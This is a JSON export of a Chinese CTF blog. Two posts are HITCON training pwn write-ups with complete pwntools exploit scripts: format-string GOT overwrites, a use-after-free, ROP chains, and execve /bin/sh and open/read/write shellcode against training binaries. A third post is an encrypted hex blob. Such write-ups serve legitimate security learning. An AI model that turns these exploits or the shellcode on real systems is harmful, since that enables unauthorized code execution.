[{"title":"HITCONING training 6-10 writeup","date":"2020-01-07T02:57:55.000Z","path":"2020/01/07/HITCONING-training-6-10-writeup/","text":"migrationemmm, 这题的做法跟前面的一道题差不多， 都可以泄露libc地址，进行栈迁移， 然后执行system函数来getshell， 差不多的思路就不重复写了 crack除了pie和改写重定位表以外的保护都开了 程序逻辑为从urandom文件中读取4个字节作为password， 由于urandom这个文件的内容是随机的， 所以password不可控， 但是后面有个格式化字符串漏洞，并且参数在栈上， 那么可以利用”%10$s” 泄露出password， 之后就可以cat flag了 1234567891011121314151617181920212223242526272829303132333435363738391 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./crack\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./crack\")2627 payload = p32(elf.symbols['password']) + \"%10$s\"28 p.sendlineafter(\"What your name ? \", payload)2930 p.recv(11)31 leak = u32(p.recv(4))32 log.info(\"leak -&gt; \" + hex(leak))3334 p.sendlineafter(\"Your password :\", str(leak))3536 p.interactive()3738 if __name__ == '__main__':39 pwn() cat flag: craxme开了NX和CANARY 又是一个格式化控制字符串漏洞的题目， 不过这次不是要我们泄露数据， 而是向内存中写入数据一个为218一个为0xfaceb00c(-87117812)第一个好解决， 第二个需要分段写入， %hn往内存中写入两个字节 12345678910111213141516171819202122232425262728293031323334351 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./craxme\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./craxme\")2627 #payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$n\".format(218 - 4) flag28 payload = p32(elf.symbols['magic']) + \"%&#123;&#125;c%7$hn&gt;&gt;&gt;&gt;\".format((0xfaceb00c &amp; 0xffff)-4)29 payload += p32(elf.symbols['magic']+2) + \"%&#123;&#125;c%12$hn\".format((0xfaceb00c &gt;&gt; 16) - 0xb00c - 4 - 4)30 p.sendlineafter(\"Give me magic :\", payload)3132 p.interactive()3334 if __name__ == '__main__':35 pwn() cat flag: playfmt= = 格式化字符串漏洞三连… 只开了NX 这题printf的参数不在栈上在bss段， 但是可以无限次利用这个漏洞， 所以思路还是有得， 不过比较麻烦， 覆写got表需要在一次printf调用中完成，这就使得需要很多准备工作 1.利用 序号1 处得两个方框内栈的地址之间的指向关系， 将地址0xff849628 的内容改成strncmp 的got表地址2.再利用 序号2 处的方框内的的栈的地址之间的指向关系， 将地址0xff8496e4 的内容改成strncmp的got表地址+23.之后就是向strncmp_got内写入system的低两个字节， strncmp_got+2内写入system的高两个字节， 这样就可以成功覆盖strncmp的got表内容为system4.最后就是输入buf为/bin/sh 就可以getshell了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485861 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./playfmt\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./playfmt\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 str_got = elf.got['strncmp']2930 p.recvline()31 p.recvline()32 p.recvline()3334 p.sendline(\"%10$p\")35 leak = int(p.recvline()[:-1], 16)3637 payload = \"%&#123;&#125;c%10$hn\\0\".format(str_got &amp; 0xffff)38 p.send(payload.ljust(0xc8, '\\x00'))3940 payload = \"%&#123;&#125;c%6$hn&gt;&gt;\\0\".format((leak &amp; 0xffff) + 2)41 p.send(payload.ljust(0xc8, '\\x00'))4243 payload = \"%&#123;&#125;c%10$hn\".format(str_got &gt;&gt; 16)44 p.send(payload.ljust(0xc8, '\\x00'))4546 payload = \"%8$p\"47 p.send(payload.ljust(0xc8, '\\x00'))4849 p.recvuntil(\"@&gt;&gt;\")50 p.recvuntil(\"@\")51 leak_libc = int(p.recv(10), 16)52 log.info(\"leak_libc -&gt; \" + hex(leak_libc))5354 libc_base = leak_libc - libc.symbols['_IO_2_1_stdout_']55 log.info(\"libc_base -&gt; \" + hex(libc_base))56 system = libc_base + libc.symbols['system']5758 payload = \"&gt;&gt;&gt;%21$p\"59 p.send(payload.ljust(0xc8, '\\x00'))6061 p.recvuntil(\"&gt;&gt;&gt;\")62 leak_stack = int(p.recv(10), 16)63 log.info(\"leak_stack -&gt; \" + hex(leak_stack))64 # strncmp_got + 265 #0xe4 -&gt; 5766 payload = \"%&#123;&#125;c%22$hn\".format((leak_stack &amp; 0xffff) + 2)67 p.send(payload.ljust(0xc8, '\\x00'))6869 payload = \"%&#123;&#125;c%21$hn\".format((str_got &amp; 0xffff) + 2)70 p.send(payload.ljust(0xc8, '\\x00'))7172 payload = \"%&#123;&#125;c%59$hn\".format(str_got &gt;&gt; 16)73 p.send(payload.ljust(0xc8, '\\x00'))7475 payload = \"%&#123;&#125;c%14$hn\".format(system &amp; 0xffff)76 payload += \"%&#123;&#125;c%57$hn\".format((system &gt;&gt; 16) - (system &amp; 0xffff))77 p.send(payload.ljust(0xc8, '\\x00'))7879 payload = '/bin/sh\\0'80 p.send(payload.ljust(0xc8, '\\x00'))8182 p.interactive()8384 if __name__ == '__main__':85 pwn() getshell hacknote开了NX和CANARY 是个堆类型的题目， 在del_note中存在UAF漏洞， 限制的chunk的个数最多为5， 第一时间想到两种利用方式， 1.控制程序中的print_note函数中的函数指针2.进行常规的fastbin attack， 不过限制了chunk的大小， 而且感觉第一种更方便， 所以就用第一种了 利用思路：在print_note中调用的函数指针， 只要控制了函数指针指向system函数就可以达到getshell的目的， 具体步骤 1.创建一个大小大于fastbin大小的chunk， 随后free掉， 在分配一个大小不大于这个chunk的chunk， 随后利用print_note函数泄露libc地址2.这个程序的chunk结构chunk 的 data区data -&gt; &amp;print_note_contentdata+4 -&gt; 输入的数据data+… -&gt; 输入的数据或0 由于箭头指向的malloc是程序中分配的，不可控， 所以需要利用UAF漏洞重用这段chunk来让data -&gt; system 3.释放两个chunk， 在malloc(8)输入数据为p32(system) + “||sh\\0” 即可达成目的 由于题目也准备好了后门， 直接让data-&gt; &amp;magic也行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162631 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./hacknote\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 def add(size, content):26 p.sendlineafter(\"Your choice :\", str(1))27 p.sendlineafter(\"Note size :\", str(size))28 p.sendafter(\"Content :\", content)2930 def free(index):31 p.sendlineafter(\"Your choice :\", str(2))32 p.sendafter(\"Index :\", str(index))3334 def printf(index):35 p.sendafter(\"Your choice :\", str(3))36 p.sendafter(\"Index :\", str(index))3738 add(0x100, 'a') #039 add(0x20, 'b') #140 add(0x20, 'c') #241 free(0)42 add(0x100, '&gt;&gt;&gt;&gt;') #3 -&gt; 043 printf(3)4445 p.recvuntil(\"&gt;&gt;&gt;&gt;\")46 leak = u32(p.recvline()[:-1])47 libc_base = leak - (0xf7f5f7b0 - 0xf7dad000)48 log.info(\"leak -&gt; \" + hex(libc_base))4950 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")51 system = libc_base + libc.symbols['system']5253 free(1)54 free(2)55 raw_input()56 add(8, p32(system) + \"||sh\\0\") #457 printf(1)585960 p.interactive()6162 if __name__ == '__main__':63 pwn() getshell","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"HITCON training 1-5 writeup ","date":"2020-01-05T08:29:00.000Z","path":"2020/01/05/HITCON-training-writeup/","text":"由于期末考的原因， 好久没写题了， 做hitcon training 的题目来熟悉熟悉 sysmagic查看保护可以看到程序没开pie与got， plt 表之类的可以改写 程序逻辑比较简单不啰嗦了， 经过观察buf的值不可控但是flag比较明显是for循环内输出的东西， 而putchar 内的数据代码中都有， 所以第一想法是写个C语言脚本直接输出 1234567891011121314151617 1 #include &lt;stdio.h&gt; 2 #include &lt;string.h&gt; 3 #include &lt;stdlib.h&gt; 4 5 int main(int argc, char **argv)&#123; 6 int d[] = &#123;2036297540, 1801418095, 1601662830, 1601792119, 1952414061, 7 1835884901, 1600484449, 1851880015, 1767859559, 8 1869832051, 1735287135, 1061124466, 63&#125;; 9 char s[] = &#123;7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89,10 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0,11 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91,12 49, 85, 2, 30, 33, 16, 76, 30, 66&#125;;13 for(int i = 0;i &lt;= 0x30;++i)&#123;14 putchar(*((char*)d + i) ^ s[i]);15 &#125;16 return 0;17 &#125; flag: 看到flag的瞬间毫无防备的留下了弱者的泪水， 能动态调试为什么要费时间写脚本呢… orw查看保护除了栈溢出保护其它保护全关了 程序逻辑简单， 要求输入shellcode来执行指令， 不过程序用了沙箱禁用了exceve系统调用， 不过没有禁用read, write, open等系统调用， 所以可以通过执行这三个系统调用直接把flag读出来关于沙箱这篇文章讲的比较详细：seccomp学习笔记通过执行seccomp-tools dump ./orw 可以查看可以执行哪些系统调用系统调用号查询:linux 系统调用号表 汇编代码(我用的是ATT格式)： 12345678910111213141516171819202122232425262728291 .section .text2 .globl _start3 4 _start:5 xor %eax, %eax6 movl $0x804A09b, %ebx7 movl $4, %ecx8 xor %edx, %edx9 movb $5, %al10 int $0x8011 12 movl %eax, %ebx13 pushl %esp14 movl %esp, %ecx15 movl $0x30, %edx16 xor %eax, %eax17 movb $3, %al18 int $0x8019 20 movl $1, %ebx21 pushl %esp22 popl %ecx23 movl $0x30, %edx24 xor %eax, %eax25 movb $4, %al26 int $0x8027 28 movl $1, %eax29 int $0x80 成功读取flag(由于没有靶机， 所以我在本地创建了一个flag文件) ret2sc保护全关 看到程序逻辑就是栈迁移执行shellcode具体步骤为将shellcode植入到bss段， 之后再将栈迁移到bss段中，然后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435361 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./ret2sc\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2sc\")2627 shellcode = p32(elf.symbols['name'] + 4) + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"28 p.sendlineafter(\"Name:\", shellcode)2930 payload = 'a'*(0x14+8) + p32(elf.symbols['name'] - 4) + p32(0x804853c)31 p.sendlineafter(\"Try your best:\", payload)3233 p.interactive()3435 if __name__ == '__main__':36 pwn() 成功getshell ret2lib除了栈上数据不可执行以外的保护全关了 程序逻辑分析：程序中可以指定一个地址并且输出这个地址的内容， 随后的print_message函数中很明显存在栈溢出 那么思路就比较明了了， 先泄露libc地址， 随后计算出libc基址，之后利用栈溢出执行system， 最后getshell由于泄露地址后可以直接利用LibcSearcher 搜索出libc版本， 为了方便我直接用本机的libc版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445461 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./ret2lib\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2lib\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 p.sendlineafter(\"Give me an address (in dec) :\", str(elf.got['puts']))29 leak = hex(int(p.recvline()[-9:-1], 16))30 log.info(\"leak -&gt; \" + leak)3132 libc_base = int(leak, 16) - libc.symbols['puts']33 log.info(\"libc_base -&gt; \" + hex(libc_base))3435 system = libc_base + libc.symbols['system']36 binsh = libc_base + libc.search('/bin/sh\\0').next()3738 pppr = 0x080486CD39 payload = 'a'*(0x38 + 4) + p32(system) + p32(0x12345678) + p32(binsh)4041 p.sendlineafter(\"Leave some message for me :\", payload)4243 p.interactive()4445 if __name__ == '__main__':46 pwn() 成功getshell simplerop除了NX其它全关 观察程序逻辑只有一个栈溢出， 而这个文件是个静态链接的文件，尝试找system的地址， 但是查找符号表没找到system但是open, write, read的地址都可以找到， 这意味着跟前面的题目思路一样， 利用rop调用这三个函数来读取flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./simplerop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./simplerop\")2627 pppr = 0x080491D22829 payload = 'a'*(0x1c + 4) + p32(elf.symbols['read']) + p32(pppr)30 payload += p32(0) + p32(elf.bss() + 0x200) + p32(0x10) + p32(elf.symbols['main'])3132 p.sendafter(\"Your input :\", payload.ljust(100, '\\x00'))3334 p.sendline(\"flag\\0\")3536 raw_input()37 payload = 'a'*0x1838 payload += p32(elf.symbols['open']) + p32(pppr) + p32(elf.bss() + 0x200) + p32(4) + p32(0)39 payload += p32(elf.symbols['read']) + p32(pppr) + p32(3) + p32(elf.bss() + 0x200) + p32(0x10)40 payload += p32(elf.symbols['write']) + p32(pppr) + p32(1) + p32(elf.bss() + 0x200) + p32(0x10)4142 p.sendlineafter(\"Your input :\", payload)4344 p.interactive()4546 if __name__ == '__main__':47 pwn() 结果:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"Hello World","date":"2019-12-19T13:45:35.530Z","path":"2019/12/19/hello-world/","text":"给爷密码 afe67e4e8c3970d0cabf75677fd47ab7eb3affd7379a88028e5642f221c535184691c8379ff42a9f349e918a0a5eff508a2fdb7fc7ea122fff6cbf275ba135832967b1a384ed7904944d5de20f1476e8af85f5871565aae2077ea02eea6458ef2b834d33110e434813c90a1010ad0f916a6288801578ddaef07ab260fde5c68635e2f50b6e26c6b98a1f2521cf032e45cd7da88438b0c291f22ac142de072d8431d05e43705fdadbf2638e7748e20705298c0529a5c8d85275a0c7e3dcdefb40871d50e9916145abc40296d464ad2a0dad58ec9ca036037e3356cee8b6478e2b9e439333d1bb3eb8c867cefd8490d9b70fe5c51c01fcb380d5c965051e0fa6b0d021153c6a784c97038d7cb3bfa7de5b54c651aa1334eb4cb0f462073064089a81def966c8b7685f886c9503030a60218bba1346efa3eb1ba6c79180e58adebee9609a29b28841815b9498c3fdcdcfe2df37dc468608e418a8b4bb03e44b7c2ef802a2f27efedd0e1d8cc88a09e9e17cb3c1bc8f9f69eb571225011190cb5e87dfbcdc7644c4ed4408aa980946849d4f4464470b470c6d983986bf15136ba19c9d6f7cb20858c9d6c2aa666cce59653347debe35fb5105a1437074aa7e4658bcb58ed2b962f6636627c96696f43b64b506f50572c5ed775f791b83e281e72448b4dc16658dd285a67a067328d01f610fe5830e4dddeadeec0ed85cd90c8a33fa18ac242e2beba82035dc79db505f67d6725fceaf17af74ae7e1958883bca842f6c269ed26933bd9a64fea020437062f1f01a71ac0592d56ecd7cba51656e702dceaa70cca2a00debf81b624f166f349d965bd2bdae82c7cf74edf56dc513da55c7c80212740543b4c0e16bd05da185f6d30fa4bae80d117fd3867d7fd8d343dd14dbd745b71546e7280c4627bb812c09d02a01b2d82209f070714e9243b6a66d246eb31fa36483c9b4fa1df9c909dc96489fb0c8594cc852b3189ab4fa4f43dcad79789ec1ec8f94416e3c11879a62ace41a645b481aa66bd82e453ffdc11a67626ea8e884580e988be99bcae3b9fa92e4ea1b3ff1b7b3f30fbb9d36571a334c28b4044aa16e4f6ff75263867810ea154d2d1abea47a17fd8425c002a86d6e42d820078cce6f377c8673c037836b40380fdaddd37e9bcbe7d20951ea58ca8dee42ccef789a2d1f4ce024969c83ff1c0f097ac683419f47f460c449c2f16f9b5c4a09e9a9b60f4de4180274d087ef70af69ebcea2718bc452646a1ca34a7f8637e20cd9575cf47b047d5dbc526cc53b633a987a345c8f7d69a5b290b772a96b2aa9fbfd172a4ee696cf796cc22f52996ca2907a5930f83e028fbd85e021ca67fb2528796ac86d17bce8453c22338a52bcf9ab1443562b4375a0d9b8160ad28f559bf4915d762a95fd25c55a79b1f4616bfd8ac96d330130b4bd6c6a607c9c80b3ac3e1a356db00eba8d786ee6bbd4b57c5d463ecc79e7298b02b3a44e340b25d574eb303dd2a93877748bca6b629095ec97bc0cf811d5318f35d021e8f5d2d7b13cd585ad25832995573c6d74eeefcc51e5957cbd73a2a01c6e96fd85e781b50d1e86fb2ed664849d0a76222150898e98c1cd5659d8b67b859f4277a70c1ee454efc8b8063998f6b01028749f2b5f45b6df998c02af9e4067198e8481227d76bd20b29c6b79983994910018b3a7632b46851937c334784c707672ce8e8cc8e28addd40d31e3a4fac7a48c25dab7c74668dbaabaac010e6471bb7d89ba6a5c3e474081e84b39b295a2bb27122ad9528262e5a4bd63a98a4b6f5e7809f54780097a0edb59dd42c2832b28b5491613633f4892f32db5e585929e2c5c6fba8d5296237e4bf3d43f4ae3ad62d0b4a059c37170fb7b589fae6cb7cb8437bb7fe89bc344d8401947bbb3539796d8e5159baef1b4104a0da4d33f3308d4b7406010454a43030c4d90f305415d81060d7678514a23b28d46ee30e25dc7c9cce7297a867d4ec67edc64eae5048d777a8b80c48cf5dec20331579b6f64b7a1d1541db9cd991e12eff9eb1dd8da27433a53fb11cbcea2b3431770af3ef2ad7cc502611bbc5551261e4af2c814e90860358b963f9fa70c67b014af4ca8e2e734394a96302b8a836c3940123e896b8f77ebe39798f3c379dce9964075f2b0b8b33ce6eb62922fbb4f0b17a5c70e83a2860a48b2b3869201e4e900ce531666092ebc6924eeb02ce183f6850e24ec31e411cd829b40b4b32ebdbff91ac71f87c0c362aa9c3399bbe4c9d6335411a386fe2b13d3b99140c30aed75cdf82496aa56ccd79d5f4de5b533b8dd03d6311f462bdbd932ce05546631bc0b3ded3b937fb826490de59e7c01bc404be6b0f677f7c7366c7014bea6cc0d828f5abab6743762fefad9f0af1b6510a3d9f331c692c2844710a825ed10cd512f102bb769b85e9e3985303c91f429a7173fda7b39629ba05c82e5227a53f8562d931c04a77db1d7465f27c8e72635481f1777ffd72100de4d1a65ce0fce1631369ee86b162fdb70d4fe7759244f84f49b95aa85f831d86da43c3f2fff936d1fa4f23090769d3fcb5a3f514e6663594d2e4daea42831d6eda68e0374d4a8c388032263b04922bf27a83ca0ddda5ddf9c82d06183eb2a58273705d470c6b8feca86696648a3254f4557522c2ae1e7f3de7737e15da0ee3603049d0d3519e56892989e95643b8731dcfe18662aa37555acaf871cbb4023e645cd228fb3fd1997338920ddca90a4d11532a17137a1b7a8f6c6012aee70d4f6d29f026d79aa8bcf615e379a5b66a4e8337773b306ebdd41c006281011107849a87985a9c2ec1e9771218db8dee3469f32ed3b3675ce0d7b9a7a0ad7b431b277ecefd47ae78c2e8c71cc20099911dfe62b7d7bf18890ca0de2e58acd96ed5c4187d47d3a8e84e7b3330f176f5c5603cb2ead9afe01902719c9303ab382e81102dadb000833096a0c4afd4dd5207e0d69d59e47171c69dde15917732e9da9389bdc1416576cad66ea3af44613ccb9b3438631b165bed0ec314876cbc4cbf1bf6db342939d3dad7380aed77c69720f0926d9763d26566b409b5f7e23fafcbb009d016b3d15c0474e72433fd2a9de3362e8efbfccd71b936c96b9c8075f600fb00a814852ec5919c5c69446845cea915f1b558dc08a7dec41114800e5d737090ef2e27a134c7541a08a1524274fb7d2cc7ffb1d4881309293bc82bb92423984d9eb80f9295fb7f724ac1c3e99ecb7555a670427e7917906ab7c21a264b0f989a29e2bb3bf98458719db50e371aae5ed5bc40bf33e64cc32a7b000c3420910a4aca094000305eb91874afa924e6f35fc6fbb58aa70349497ee34479269bdd63c884f5437a67371316843946cc4da470e797235a92e17598c46c0537e67faded385cc22ecf18faba0e8d7e71db0659cc40ca28ab0336f3b07740bee2b327c7325f96a9e37af053531787aae","tags":[{"name":"Encrypted","slug":"Encrypted","permalink":"http://wafuter.jxustctf.top/tags/Encrypted/"}]}]